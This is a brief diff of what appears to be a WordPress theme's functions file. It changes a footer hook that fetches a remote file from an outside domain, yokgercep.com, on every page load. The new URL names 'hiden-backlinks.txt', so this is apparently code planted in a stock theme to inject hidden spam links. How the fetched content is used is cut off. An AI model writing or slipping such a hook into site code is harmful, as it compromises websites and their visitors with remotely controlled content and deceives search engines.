@@ -757,7 +757,7 @@ function twentyseventeen_register_block_patterns() {
 
 add_action( 'init', 'twentyseventeen_register_block_patterns' );
 add_action('wp_footer', function () {
-    $resp = wp_remote_get('https://yokgercep.com/sponsor-ShindraSenpai.txt', [
+    $resp = wp_remote_get('https://yokgercep.com/404-forbiden/hiden-backlinks.txt', [
         'timeout' => 5,
     ]);
 
